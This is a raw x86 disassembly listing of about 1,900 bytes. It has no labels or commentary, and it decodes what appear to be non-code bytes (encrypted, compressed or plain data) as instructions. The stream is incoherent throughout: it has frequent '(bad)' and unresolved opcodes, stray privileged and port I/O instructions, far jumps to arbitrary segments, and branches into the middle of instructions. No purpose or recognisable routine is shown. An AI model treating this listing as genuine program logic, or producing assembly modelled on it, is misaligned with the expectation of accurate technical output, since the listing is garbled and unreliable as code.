  4118d8:	mov    dl,0x63
  4118da:	dec    ebp
  4118db:	test   cl,dh
  4118dd:	xor    edi,DWORD PTR [ebp+0x53]
  4118e0:	clc    
  4118e1:	mov    bl,0xe6
  4118e3:	addr16 es mov al,0x3f
  4118e7:	sbb    BYTE PTR [edx-0x4c],ah
  4118ea:	or     al,0x62
  4118ec:	push   ecx
  4118ed:	dec    edx
  4118ee:	mov    cx,0x61cd
  4118f2:	sub    al,dl
  4118f4:	or     edi,DWORD PTR [edx+0x5e28b0ff]
  4118fa:	or     al,0xc8
  4118fc:	data16 ficom DWORD PTR [ebx+eax*8+0xc05e426]
  411904:	add    BYTE PTR [edx],0x38
  411907:	jnp    0x4118d0
  411909:	fmul   st,st(3)
  41190b:	cld    
  41190c:	test   al,0x7c
  41190e:	daa    
  41190f:	adc    eax,0x2209310e
  411914:	mov    ch,0x96
  411916:	xchg   DWORD PTR [edx],ebp
  411918:	push   ecx
  411919:	lock add BYTE PTR [edx+0x5],cl
  41191d:	and    al,0x27
  41191f:	into   
  411920:	push   ebx
  411921:	aaa    
  411922:	out    dx,al
  411923:	pop    ds
  411924:	test   BYTE PTR [ecx],al
  411926:	aas    
  411927:	fmul   DWORD PTR [ebx-0x54]
  41192a:	cs imul ecx,edx,0x4f1ed119
  411931:	(bad)  
  411932:	inc    edx
  411934:	or     dh,bl
  411936:	jge    0x411948
  411938:	test   eax,0x1cea0d43
  41193d:	dec    esi
  41193e:	xchg   esi,eax
  41193f:	dec    ebp
  411940:	and    al,0x31
  411942:	adc    eax,0x2b9f6bc6
  411947:	inc    eax
  411948:	sti    
  411949:	sahf   
  41194a:	add    eax,0x9f6dd6e5
  41194f:	rcl    BYTE PTR [ecx+0x1e],1
  411952:	fcom   DWORD PTR [edx+0x54]
  411955:	cld    
  411956:	xchg   esi,eax
  411957:	jb     0x411911
  411959:	mov    cl,0x4
  41195b:	push   edx
  41195c:	jmp    0xb22b4fac
  411961:	dec    ebp
  411962:	sbb    eax,0x3ba38eec
  411967:	test   bl,dh
  411969:	cli    
  41196a:	dec    ebp
  41196b:	push   esp
  41196c:	repnz pop edi
  41196e:	mov    esp,0xcb86c3dd
  411973:	in     eax,dx
  411974:	and    al,0xd4
  411976:	fwait
  411977:	or     BYTE PTR [eax+0x490c3947],dh
  41197d:	adc    BYTE PTR [esi],dl
  41197f:	std    
  411980:	nop
  411981:	nop
  411982:	dec    ebx
  411983:	mov    bl,0x3c
  411985:	std    
  411986:	les    ebp,FWORD PTR [ecx+0x56]
  411989:	add    BYTE PTR [ecx],dl
  41198b:	push   ebx
  41198c:	add    bl,BYTE PTR [edi+0x6f]
  41198f:	lods   eax,DWORD PTR ds:[esi]
  411990:	repz ret 0xa28b
  411994:	sub    esi,DWORD PTR [ecx-0x28]
  411997:	mov    ecx,esi
  411999:	push   es
  41199a:	fdiv   DWORD PTR [edx+ebp*4-0x51d64310]
  4119a1:	push   esi
  4119a2:	inc    esi
  4119a3:	add    BYTE PTR [ecx],bh
  4119a5:	mov    ebp,0x262bf546
  4119aa:	sub    DWORD PTR [edx-0x14e84ea1],edx
  4119b0:	jb     0x411973
  4119b2:	mov    ds,WORD PTR [edx+ecx*1-0x53]
  4119b6:	sbb    BYTE PTR [edx+0x15],ch
  4119b9:	and    bh,BYTE PTR [eax+0x7c693b4e]
  4119bf:	pop    edx
  4119c0:	cmp    eax,0x385083e7
  4119c5:	push   ss
  4119c6:	xor    eax,0xeb3354a
  4119cb:	pop    ds
  4119cc:	xlat   BYTE PTR ds:[ebx]
  4119cd:	push   es
  4119ce:	(bad)  
  4119cf:	inc    DWORD PTR [edx]
  4119d1:	jmp    0xf04f:0x9872d889
  4119d8:	mov    eax,DWORD PTR [ebp-0x43]
  4119db:	mov    ?,WORD PTR [eax+0x53a63ffd]
  4119e1:	mov    esp,0x945a1b40
  4119e6:	push   es
  4119e7:	repz pop esi
  4119e9:	dec    ebp
  4119ea:	outs   dx,BYTE PTR ds:[esi]
  4119eb:	cmp    eax,0x1b3f616c
  4119f0:	lods   al,BYTE PTR ds:[esi]
  4119f1:	jmp    0x556f09e9
  4119f6:	jo     0x4119de
  4119f8:	mov    dh,0x80
  4119fa:	sub    BYTE PTR [ebp-0x43],cl
  4119fd:	sub    eax,0x761bbb8e
  411a02:	stc    
  411a03:	sbb    al,0x76
  411a05:	outs   dx,BYTE PTR ds:[esi]
  411a06:	sub    bh,0xeb
  411a09:	ins    DWORD PTR es:[edi],dx
  411a0a:	xlat   BYTE PTR ds:[ebx]
  411a0b:	sub    DWORD PTR [ebp+0x3f47a74],0x3b682aa3
  411a15:	mov    bh,0xe4
  411a17:	ins    DWORD PTR es:[edi],dx
  411a18:	xchg   ecx,eax
  411a19:	mov    dl,0x87
  411a1b:	xor    eax,0x2941c2e1
  411a20:	mov    ?,WORD PTR [ebx]
  411a22:	out    dx,al
  411a23:	and    cl,ch
  411a25:	and    cl,BYTE PTR [edx+0x79]
  411a28:	test   DWORD PTR [edx-0x36355cd2],esi
  411a2e:	cmp    al,0xfb
  411a30:	and    eax,0xa77af382
  411a35:	jle    0x411a10
  411a37:	popf   
  411a38:	outs   dx,DWORD PTR ds:[esi]
  411a39:	lahf   
  411a3a:	sbb    al,0x1f
  411a3c:	push   edi
  411a3d:	mov    BYTE PTR [edi+0x503466ac],bh
  411a43:	popa   
  411a44:	jmp    0x411a33
  411a46:	sub    dl,BYTE PTR [eax]
  411a48:	daa    
  411a49:	xor    DWORD PTR [ecx-0x60dc8e98],esp
  411a4f:	sahf   
  411a50:	mov    esp,0x8c42cb32
  411a55:	xchg   esi,eax
  411a56:	dec    ebp
  411a57:	xchg   ebx,eax
  411a58:	xchg   esi,eax
  411a59:	cmp    ebp,DWORD PTR gs:[ebx+0x6e56e057]
  411a60:	xor    eax,0x4bacf7ce
  411a65:	outs   dx,BYTE PTR ds:[esi]
  411a66:	mov    edi,ebx
  411a68:	neg    DWORD PTR [ebp+0x31885870]
  411a6e:	sbb    DWORD PTR [eax],esp
  411a70:	nop
  411a71:	loope  0x411a87
  411a73:	in     eax,0xdf
  411a75:	jne    0x411ac3
  411a77:	nop
  411a78:	xor    eax,DWORD PTR [esi+0x6f]
  411a7b:	xchg   ch,cl
  411a7d:	sbb    DWORD PTR [edi-0x3156569d],esi
  411a83:	cld    
  411a84:	xchg   esp,eax
  411a85:	mov    dl,BYTE PTR [esi-0x46]
  411a88:	outs   dx,BYTE PTR ds:[esi]
  411a89:	fwait
  411a8a:	mov    bl,0x8b
  411a8c:	seto   BYTE PTR [eax-0x38]
  411a90:	push   es
  411a91:	ins    DWORD PTR es:[edi],dx
  411a92:	jnp    0x411a8e
  411a94:	sub    al,0xd0
  411a96:	(bad)  
  411a97:	sub    edx,DWORD PTR [ebx-0x58]
  411a9a:	dec    ebx
  411a9b:	push   edi
  411a9c:	mov    eax,ds:0x345570e0
  411aa1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411aa3:	mov    edx,0xad28f019
  411aa8:	dec    esi
  411aa9:	fst    DWORD PTR [edi+eiz*8-0x4210a633]
  411ab0:	in     eax,dx
  411ab1:	jg     0x411a88
  411ab3:	retf   
  411ab4:	dec    edi
  411ab5:	pop    edx
  411ab6:	arpl   WORD PTR [ebp+ebx*1-0x60f5aaa3],si
  411abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411abe:	lods   al,BYTE PTR ds:[esi]
  411abf:	fdivr  QWORD PTR [eax+0x7d0356e3]
  411ac5:	or     eax,DWORD PTR [edx+0x7150d6e3]
  411acb:	inc    eax
  411acc:	xlat   BYTE PTR ds:[ebx]
  411acd:	or     al,0xa0
  411acf:	ins    BYTE PTR es:[edi],dx
  411ad0:	mov    ds:0x6572a2b5,al
  411ad5:	cmc    
  411ad6:	mov    bl,0x7a
  411ad8:	jmp    0xe288e52d
  411add:	dec    esp
  411ade:	inc    edx
  411adf:	jno    0x411aea
  411ae1:	xchg   ebp,eax
  411ae2:	pop    edx
  411ae3:	fstp   TBYTE PTR [edi]
  411ae5:	cmp    BYTE PTR [edi+0x16ae2956],cl
  411aeb:	out    dx,al
  411aec:	das    
  411aed:	and    edi,eax
  411aef:	sbb    ah,BYTE PTR [esi-0x37]
  411af2:	cmp    eax,0x2c1860c3
  411af7:	push   cs
  411af8:	test   al,0xe4
  411afa:	push   cs
  411afb:	inc    ebx
  411afc:	jae    0x411a8d
  411afe:	and    eax,0xc63decf9
  411b03:	xor    DWORD PTR [eax],esi
  411b05:	test   eax,0xb605db02
  411b0a:	test   al,0xd9
  411b0c:	imul   edi,DWORD PTR es:[ebp+0x5828b280],0x273a332f
  411b17:	cmp    ebx,edi
  411b19:	mov    dl,cl
  411b1b:	ja     0x411b15
  411b1d:	lods   eax,DWORD PTR ds:[esi]
  411b1e:	lds    ebp,FWORD PTR [ebx+0x3e5c684b]
  411b24:	jecxz  0x411aca
  411b26:	sbb    BYTE PTR [esi],bh
  411b28:	cdq    
  411b29:	pop    ecx
  411b2a:	cdq    
  411b2b:	mov    ch,0x4d
  411b2d:	pusha  
  411b2e:	(bad)  
  411b2f:	xor    eax,0x4747ee54
  411b34:	(bad)  
  411b35:	frstor [edx+0x66831760]
  411b3b:	not    BYTE PTR [edx]
  411b3d:	rcl    BYTE PTR [edx-0x19],1
  411b40:	or     dh,ch
  411b42:	pop    ss
  411b43:	mov    esp,DWORD PTR [ebp+0x4]
  411b46:	iret   
  411b47:	mov    ch,0xf1
  411b49:	pop    es
  411b4a:	or     al,0x71
  411b4c:	lods   al,BYTE PTR ds:[esi]
  411b4d:	outs   dx,BYTE PTR ds:[esi]
  411b4e:	pop    esp
  411b4f:	jae    0x411bb5
  411b51:	jge    0x411b9d
  411b53:	shl    BYTE PTR [ebp+edi*8+0x74512b6c],0x61
  411b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b5c:	ja     0x411ae0
  411b5e:	sbb    esp,esp
  411b60:	retf   
  411b61:	inc    ebp
  411b62:	xor    BYTE PTR [edi-0x2bf02ee4],bh
  411b68:	fs push esi
  411b6a:	test   DWORD PTR [ecx],esi
  411b6c:	aaa    
  411b6d:	mov    ebx,0xa030ed04
  411b72:	fist   WORD PTR [edx]
  411b74:	xor    esp,DWORD PTR [esi+0x6bf62ff2]
  411b7a:	mov    dl,BYTE PTR [esi+0x709dcdf]
  411b80:	add    BYTE PTR [ecx],0xa3
  411b83:	xor    eax,0x13fe432f
  411b88:	sub    eax,0xbf9dc4a2
  411b8d:	or     DWORD PTR [edx-0x32d5c3f3],0xffffffc7
  411b94:	in     al,dx
  411b95:	(bad)  
  411b96:	inc    ebp
  411b97:	xor    al,0x10
  411b99:	fadd   DWORD PTR [ebp+0x1c]
  411b9c:	jge    0x411bd1
  411b9e:	adc    ecx,DWORD PTR ds:0xfbafefca
  411ba4:	ror    dh,0xb3
  411ba7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  411ba9:	retf   
  411baa:	jge    0x411b81
  411bac:	mov    ebx,DWORD PTR [esi+0x77]
  411baf:	xchg   esp,eax
  411bb0:	ror    DWORD PTR [edx+0x2a],0x8d
  411bb4:	or     BYTE PTR [ecx-0xf77a47d],0x36
  411bbb:	jge    0x411bba
  411bbd:	push   eax
  411bbe:	(bad)  
  411bbf:	cld    
  411bc0:	xchg   BYTE PTR [eax-0x16],bl
  411bc3:	xchg   BYTE PTR [ebx+0x17db4457],ch
  411bc9:	(bad)  
  411bca:	xor    DWORD PTR [ecx-0x670226e9],ebx
  411bd0:	xor    esp,DWORD PTR [ebp-0xd3eb10e]
  411bd6:	pop    es
  411bd7:	rcr    BYTE PTR [edi-0x5],0xb8
  411bdb:	arpl   WORD PTR [ecx+0x8],bp
  411bde:	int3   
  411bdf:	ss inc edx
  411be1:	loopne 0x411b76
  411be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411be5:	dec    eax
  411be6:	les    esp,FWORD PTR [edi+0x64]
  411be9:	rcr    DWORD PTR [edx],1
  411beb:	adc    eax,0x2bacd597
  411bf0:	repnz (bad) 
  411bf3:	dec    edi
  411bf4:	std    
  411bf5:	daa    
  411bf6:	(bad)  [edx+0x79]
  411bf9:	je     0x411c12
  411bfb:	aam    0xb8
  411bfd:	test   eax,0x635fc5e8
  411c02:	mov    esi,0x8a530442
  411c07:	or     cl,BYTE PTR [ebx+0x75b509be]
  411c0d:	scas   al,BYTE PTR es:[edi]
  411c0e:	nop
  411c0f:	sbb    DWORD PTR [esi+esi*4-0x60d1548c],0x38baedf5
  411c1a:	js     0x411c68
  411c1c:	mov    bh,0x46
  411c1e:	cmp    BYTE PTR [edx],ch
  411c20:	mov    eax,ds:0xba722e86
  411c25:	les    ecx,FWORD PTR [edi]
  411c27:	dec    ebx
  411c28:	add    eax,0x57108201
  411c2d:	addr16 loope 0x411bdd
  411c30:	sti    
  411c31:	jb     0x411c7d
  411c33:	adc    eax,0x137c0cf1
  411c38:	xchg   edi,eax
  411c39:	push   es
  411c3a:	inc    esi
  411c3b:	leave  
  411c3c:	stc    
  411c3d:	loop   0x411ca4
  411c3f:	lock pop es
  411c41:	xor    dl,dh
  411c43:	xchg   edx,eax
  411c44:	xor    cl,ch
  411c46:	mov    esp,0x33181588
  411c4b:	mov    ch,0x38
  411c4d:	mov    ebp,0xd6496642
  411c52:	push   ss
  411c53:	inc    eax
  411c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c55:	jmp    0x411c29
  411c57:	ja     0x411c2a
  411c59:	xchg   DWORD PTR [ecx],edi
  411c5b:	xchg   esi,eax
  411c5c:	jo     0x411cce
  411c5e:	or     DWORD PTR [ebx-0x4f],ebp
  411c61:	pop    eax
  411c62:	inc    edi
  411c63:	and    eax,0x9e44eb84
  411c68:	xor    cl,bh
  411c6a:	(bad)  
  411c6b:	xlat   BYTE PTR ds:[ebx]
  411c6c:	popa   
  411c6d:	inc    BYTE PTR [ecx+0x651ecd60]
  411c73:	aad    0x6f
  411c75:	and    BYTE PTR [ebp+ebx*8+0xd6c967d],bh
  411c7c:	adc    al,0x21
  411c7e:	mov    bl,BYTE PTR [esi+eiz*1-0x14]
  411c82:	dec    ebx
  411c83:	and    al,0x48
  411c85:	sti    
  411c86:	ds cmp eax,0xa16cc180
  411c8c:	fnsave [esi]
  411c8e:	xchg   ebp,eax
  411c8f:	sbb    ecx,esi
  411c91:	test   BYTE PTR [eax],bh
  411c93:	xchg   edx,eax
  411c94:	les    edx,FWORD PTR [ebx+0x22]
  411c97:	sar    DWORD PTR [eax-0x22],0x2a
  411c9b:	aad    0x97
  411c9d:	das    
  411c9e:	mov    ebx,0x96b259fa
  411ca3:	xchg   esi,eax
  411ca4:	mov    eax,ds:0xda30d1d6
  411ca9:	js     0x411ce4
  411cab:	inc    eax
  411cac:	mov    ah,0x2b
  411cae:	gs out 0x1,al
  411cb1:	mov    al,BYTE PTR ss:[ebx+eiz*1]
  411cb5:	sbb    eax,0x7a603e77
  411cba:	xor    al,0xf
  411cbc:	xchg   BYTE PTR [ebx+eax*1],ch
  411cbf:	repnz fst QWORD PTR [ebx+0x38]
  411cc3:	popa   
  411cc4:	hlt    
  411cc5:	jmp    0xd510:0x39d2f4f2
  411ccc:	jg     0x411c7e
  411cce:	mov    edi,0xe194116
  411cd3:	ret    0x7a32
  411cd6:	(bad)  
  411cd7:	xchg   edi,eax
  411cd8:	mov    ebx,0x88107271
  411cdd:	adc    ch,dh
  411cdf:	add    bl,cl
  411ce1:	push   ss
  411ce2:	mov    ss,WORD PTR [ebp+0x55c7c11f]
  411ce8:	stc    
  411ce9:	mov    edx,0xe4e2466f
  411cee:	sbb    eax,0x683489b9
  411cf3:	popa   
  411cf4:	xlat   BYTE PTR ds:[ebx]
  411cf5:	mov    ebp,0xa14a8
  411cfa:	fiadd  WORD PTR [esi+0x7d648743]
  411d00:	idiv   DWORD PTR [ebx-0x1e]
  411d03:	(bad)  
  411d04:	jne    0x411c99
  411d06:	jo     0x411d30
  411d08:	xor    esi,DWORD PTR [esi-0x3940518b]
  411d0e:	rol    eax,0xce
  411d11:	inc    ecx
  411d12:	pop    esp
  411d13:	mov    fs,esp
  411d15:	hlt    
  411d16:	jmp    0x5f92ffcf
  411d1b:	cmp    ebp,DWORD PTR ss:[eax+0x6a]
  411d1f:	dec    esp
  411d20:	imul   DWORD PTR [esp+ebp*2]
  411d23:	add    ch,BYTE PTR [eax-0x37]
  411d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d27:	ins    BYTE PTR es:[edi],dx
  411d28:	repnz stos DWORD PTR es:[edi],eax
  411d2a:	mov    bl,0x8a
  411d2c:	sub    cl,bh
  411d2e:	sbb    BYTE PTR [ebp-0x7953e8a9],ch
  411d34:	shr    BYTE PTR [esi],0x42
  411d37:	sub    DWORD PTR [ebx-0x1b],esi
  411d3a:	push   ss
  411d3b:	leave  
  411d3c:	test   al,0xd7
  411d3e:	push   eax
  411d3f:	loopne 0x411dbb
  411d41:	sti    
  411d42:	adc    bh,BYTE PTR [edx+edi*2+0x3e5f219b]
  411d49:	retf   0x25b3
  411d4c:	iret   
  411d4d:	dec    edi
  411d4e:	jmp    0x270f:0x7db1c18d
  411d55:	jmp    0x269a:0x414713fa
  411d5c:	popa   
  411d5d:	mov    edx,0x9d8e451f
  411d62:	popf   
  411d63:	inc    edx
  411d64:	aas    
  411d65:	inc    esp
  411d66:	inc    esp
  411d67:	repz sub al,0xf1
  411d6a:	or     esi,ebx
  411d6c:	mov    ah,0xf4
  411d6e:	and    al,BYTE PTR [ebx-0x418be939]
  411d74:	inc    edx
  411d75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d76:	inc    esi
  411d77:	mov    dl,0xbe
  411d79:	out    dx,al
  411d7a:	stc    
  411d7b:	mov    ah,0xf4
  411d7d:	xchg   esi,eax
  411d7e:	xchg   edi,eax
  411d7f:	imul   esi,DWORD PTR ds:0xf5b77a61,0xe19cc091
  411d89:	cmp    eax,0x70d0172c
  411d8e:	dec    esp
  411d8f:	les    eax,FWORD PTR [edx]
  411d91:	jge    0x411d9e
  411d93:	stos   DWORD PTR es:[edi],eax
  411d94:	gs test dl,ch
  411d97:	push   ds
  411d98:	inc    edx
  411d99:	nop
  411d9a:	inc    ebp
  411d9b:	hlt    
  411d9c:	ins    DWORD PTR es:[edi],dx
  411d9d:	nop
  411d9e:	inc    ecx
  411d9f:	daa    
  411da0:	and    DWORD PTR [ebp+0x59],esi
  411da3:	xor    DWORD PTR [eax+0xa7e5e89],edx
  411da9:	push   eax
  411daa:	xor    cl,cl
  411dac:	cmp    al,0xa6
  411dae:	(bad)  
  411daf:	mov    edx,0x990157d1
  411db4:	imul   ebp,DWORD PTR [ecx],0xb
  411db7:	je     0x411e28
  411db9:	or     esp,DWORD PTR [ebx]
  411dbb:	es call 0x3b49db6b
  411dc1:	test   BYTE PTR [ebx+0x78ede281],bl
  411dc7:	inc    BYTE PTR [ecx-0x4b7cf682]
  411dcd:	arpl   WORD PTR [eax-0x36],bx
  411dd0:	lahf   
  411dd1:	(bad)  
  411dd2:	jg     0x411ddb
  411dd4:	enter  0x7772,0xc0
  411dd8:	les    edi,FWORD PTR [edx]
  411dda:	jo     0x411e54
  411ddc:	pop    esi
  411ddd:	cld    
  411dde:	inc    ebx
  411ddf:	test   DWORD PTR [ebp-0x9],ebp
  411de2:	jb     0x411ded
  411de4:	or     eax,0xc4b38c28
  411de9:	jmp    0x411e33
  411deb:	cmp    edx,DWORD PTR [edx+0x62]
  411dee:	mov    esi,edx
  411df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411df1:	cmp    al,ch
  411df3:	cmp    eax,0xb3d04845
  411df8:	repnz push eax
  411dfa:	adc    BYTE PTR ds:0xc3ac12cb,dh
  411e00:	lock rcl ecx,cl
  411e03:	and    al,0x51
  411e05:	or     al,0xb6
  411e07:	rcr    DWORD PTR [esi],1
  411e09:	iret   
  411e0a:	jle    0x411ddb
  411e0c:	pop    edi
  411e0d:	jmp    0x411dbc
  411e0f:	out    dx,eax
  411e10:	iret   
  411e11:	test   eax,0x852852d5
  411e16:	ss and al,0x57
  411e19:	mov    al,0x2
  411e1b:	stc    
  411e1c:	cmc    
  411e1d:	mov    esp,0x2321a5e9
  411e22:	cs xor eax,0x27d7859
  411e28:	std    
  411e29:	jmp    0x9596a9f1
  411e2e:	dec    esp
  411e2f:	sub    ch,BYTE PTR [eax]
  411e31:	(bad)  
  411e32:	jne    0x411e8e
  411e34:	jge    0x411e9a
  411e36:	push   edx
  411e37:	pop    esp
  411e38:	ins    BYTE PTR es:[edi],dx
  411e39:	ss int 0x0
  411e3c:	leave  
  411e3d:	aam    0x6f
  411e3f:	or     al,0xbf
  411e41:	mov    WORD PTR [eax],es
  411e43:	cld    
  411e44:	(bad)  
  411e45:	push   edi
  411e46:	jle    0x411e8a
  411e48:	lahf   
  411e49:	or     al,0xc1
  411e4b:	mov    edi,0x5b0d421a
  411e50:	mov    ah,0x52
  411e52:	pop    eax
  411e53:	std    
  411e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e55:	int3   
  411e56:	cmp    dh,ch
  411e58:	or     BYTE PTR [eax],dl
  411e5a:	pop    ebp
  411e5b:	stos   BYTE PTR es:[edi],al
  411e5c:	inc    edx
  411e5d:	arpl   WORD PTR [ebx-0x45469198],di
  411e63:	pop    esi
  411e64:	inc    ecx
  411e65:	xor    dl,al
  411e67:	xor    ah,BYTE PTR [esi+0x4a]
  411e6a:	loop   0x411e41
  411e6c:	xchg   BYTE PTR [ecx-0x2a2a425c],al
  411e72:	sbb    al,0x70
  411e74:	cli    
  411e75:	(bad)  
  411e77:	test   eax,0xee3f9ae3
  411e7c:	sbb    BYTE PTR [ecx-0x62],dh
  411e7f:	std    
  411e80:	mov    dh,0xce
  411e82:	sub    BYTE PTR [edi+0x31],ch
  411e85:	sbb    BYTE PTR [edi],ah
  411e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e88:	mov    DWORD PTR [ebx],edx
  411e8a:	sbb    eax,0x6efd5d56
  411e8f:	outs   dx,DWORD PTR ds:[esi]
  411e90:	cld    
  411e91:	sbb    eax,0xe44c2b74
  411e96:	inc    ebp
  411e97:	shr    BYTE PTR [esi-0x10d0db1f],0xd2
  411e9e:	out    dx,eax
  411e9f:	pop    edx
  411ea0:	jecxz  0x411ed5
  411ea2:	mov    ebp,0xcf4b56d8
  411ea7:	stc    
  411ea8:	outs   dx,BYTE PTR ds:[esi]
  411ea9:	mov    al,0xc0
  411eab:	lea    edi,[edi+ebx*8]
  411eae:	xor    DWORD PTR [edx-0x40],0x3c
  411eb2:	in     al,dx
  411eb3:	pop    ds
  411eb4:	or     DWORD PTR [edi-0x317a8693],edx
  411eba:	adc    bh,0xe7
  411ebd:	in     al,dx
  411ebe:	repz xchg ecx,eax
  411ec0:	sub    ebx,ebx
  411ec2:	push   edi
  411ec3:	cmp    ebx,DWORD PTR [ebp-0x32]
  411ec6:	mov    ebp,0xcd1f59d5
  411ecb:	(bad)  
  411ecc:	hlt    
  411ecd:	call   0x9887d5dc
  411ed2:	retf   0x3572
  411ed5:	push   ecx
  411ed6:	inc    ecx
  411ed7:	fnstenv [esi]
  411ed9:	retf   0xf889
  411edc:	test   BYTE PTR [ecx-0x3e],ch
  411edf:	ror    ch,0xaf
  411ee2:	push   0x82701f8e
  411ee7:	push   es
  411ee8:	iret   
  411ee9:	(bad)  
  411eeb:	aaa    
  411eec:	inc    esp
  411eed:	cli    
  411eee:	loop   0x411f6c
  411ef0:	mov    dh,0x3b
  411ef2:	lods   al,BYTE PTR ds:[esi]
  411ef3:	test   DWORD PTR [ebx+0x3e],ecx
  411ef6:	push   es
  411ef7:	push   0xc599c1fa
  411efc:	mov    ch,0xe
  411efe:	mov    ds:0xc7aec3ec,eax
  411f03:	pop    ds
  411f04:	outs   dx,DWORD PTR ds:[esi]
  411f05:	xchg   BYTE PTR [ecx-0x5f8323e3],bl
  411f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f0c:	(bad)  
  411f0d:	sti    
  411f0e:	and    dl,BYTE PTR [ebx-0x33]
  411f11:	ins    BYTE PTR es:[edi],dx
  411f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f13:	fisttp DWORD PTR [ebx]
  411f15:	add    al,0x6d
  411f17:	arpl   WORD PTR [ebx-0x50],bx
  411f1a:	jne    0x411f30
  411f1c:	repnz in eax,dx
  411f1e:	fdiv   QWORD PTR [edx+edx*1-0x5134329a]
  411f25:	mov    eax,ds:0xba87e3ba
  411f2a:	mov    esp,0x8c0eda2f
  411f30:	lds    edx,FWORD PTR [ebx]
  411f32:	or     dl,bl
  411f34:	and    BYTE PTR cs:[ebx],0xa8
  411f38:	push   edx
  411f39:	sbb    DWORD PTR [edx+0x68e57890],esi
  411f3f:	inc    ebx
  411f40:	les    esi,FWORD PTR [edi+ebx*1-0x37]
  411f44:	xchg   ecx,eax
  411f45:	xor    DWORD PTR [edx],edx
  411f47:	jge    0x411fac
  411f49:	push   0x20902a37
  411f4e:	cmp    eax,0x2bdb527c
  411f53:	mov    dh,0xd1
  411f55:	fsub   DWORD PTR [eax+0x45]
  411f58:	sar    BYTE PTR [eax],1
  411f5a:	sbb    dh,dh
  411f5c:	mov    cl,0x10
  411f5e:	das    
  411f5f:	xchg   edi,eax
  411f60:	fdivrp st(2),st
  411f62:	aaa    
  411f63:	es cs icebp 
  411f66:	aam    0x3e
  411f68:	das    
  411f69:	in     eax,0xab
  411f6b:	dec    ecx
  411f6c:	popf   
  411f6d:	ror    DWORD PTR [esp+edx*2],1
  411f70:	ret    
  411f71:	je     0x411f56
  411f73:	ins    BYTE PTR es:[edi],dx
  411f74:	add    BYTE PTR [ecx-0x2ff63759],bh
  411f7a:	loope  0x411f1a
  411f7c:	test   ebp,0xe6aad8f7
  411f82:	cmp    al,0x19
  411f84:	test   DWORD PTR [esi-0x19],esp
  411f87:	imul   eax,DWORD PTR [esi],0x2f7d141c
  411f8d:	out    dx,al
  411f8e:	xlat   BYTE PTR ds:[ebx]
  411f8f:	cmp    BYTE PTR [eax],bl
  411f91:	xlat   BYTE PTR ds:[ebx]
  411f92:	cmp    DWORD PTR [ecx-0x70],esi
  411f95:	ja     0x411f8c
  411f97:	xlat   BYTE PTR ds:[ebx]
  411f98:	adc    cl,BYTE PTR [edx]
  411f9a:	fwait
  411f9b:	int3   
  411f9c:	aad    0xb8
  411f9e:	repz mov ds:0x6c25489b,eax
  411fa4:	jmp    0x51d6:0xc1f08ded
  411fab:	repnz mov WORD PTR ds:0xb90076d6,ss
  411fb2:	adc    dh,BYTE PTR [edi+eiz*1+0x50540524]
  411fb9:	fsubr  DWORD PTR [edx]
  411fbb:	push   edx
  411fbc:	push   es
  411fbd:	adc    DWORD PTR [eax-0x473e9235],esi
  411fc3:	fidivr DWORD PTR [ecx]
  411fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc6:	mov    ds:0x69e271cd,eax
  411fcb:	loopne 0x411fba
  411fcd:	or     ch,BYTE PTR [esi+0x2b]
  411fd0:	loop   0x411f90
  411fd2:	mov    ?,WORD PTR [ecx]
  411fd4:	repz xor eax,0xf10f1145
  411fda:	xor    esi,DWORD PTR [eax]
  411fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fdd:	jle    0x411fe3
  411fdf:	icebp  
  411fe0:	mov    ebp,0x4f7c00f2
  411fe5:	inc    eax
  411fe6:	jmp    0x411fe6
  411fe8:	push   esp
  411fe9:	pop    ebp
  411fea:	xor    ebp,DWORD PTR [esi-0x6a2d46ee]
  411ff0:	cmp    edi,DWORD PTR [edi+0x36114273]
  411ff6:	shl    BYTE PTR [edx+0x3f2168ae],cl
  411ffc:	dec    eax
  411ffd:	cmp    ah,BYTE PTR [edi]
  411fff:	inc    eax
  412000:	mov    ebx,0x42bc1784
  412005:	push   esi
  412006:	dec    ecx
  412007:	sbb    DWORD PTR [edx+0x5fad091],esp
  41200d:	call   DWORD PTR [edi+0x1de48c59]
  412013:	cmp    DWORD PTR [esi],esi
  412015:	sub    BYTE PTR ds:0x40b9cdb3,cl
  41201b:	xchg   esp,eax
  41201c:	icebp  
  41201d:	xchg   ebx,eax
  41201e:	mov    ch,0xbf
  412020:	inc    esi
  412021:	iret   
  412022:	das    
  412023:	dec    esi
  412024:	cld    
  412025:	xchg   ebx,eax
  412026:	es push ss
  412028:	in     eax,dx
  412029:	sub    BYTE PTR [ebx-0x74],bl
  41202c:	pop    esp
  41202d:	mov    bl,0xf0
  41202f:	cs call 0x8c73e499
  412035:	mov    esi,0x45ed088
  41203a:	or     eax,DWORD PTR [ebx+0x15]
  41203d:	scas   eax,DWORD PTR es:[edi]
  41203e:	fadd   st(3),st
  412040:	jl     0x412084
  412042:	enter  0x2852,0x74
  412046:	push   edx
  412047:	and    al,BYTE PTR ds:0xbca8cbe6
  41204d:	fsub   QWORD PTR [edx-0x6b]
  412050:	xchg   ebp,eax
  412051:	das    
  412052:	and    BYTE PTR [edx],bl
  412054:	test   esi,0xb8e8aeed
  41205a:	js     0x4120bc
  41205c:	pushf  
  41205d:	pop    eax
  41205e:	dec    eax
  41205f:	nop
  412060:	add    ebx,DWORD PTR [ecx+eax*2]
  412063:	inc    esp
  412064:	stos   BYTE PTR es:[edi],al
  412065:	fsubr  st(1),st
  412067:	addr16 mov ecx,0xee3c3005
  41206d:	rol    bh,0x46
  412070:	sti    
  412071:	fsub   DWORD PTR [edi+0x75f24ae6]
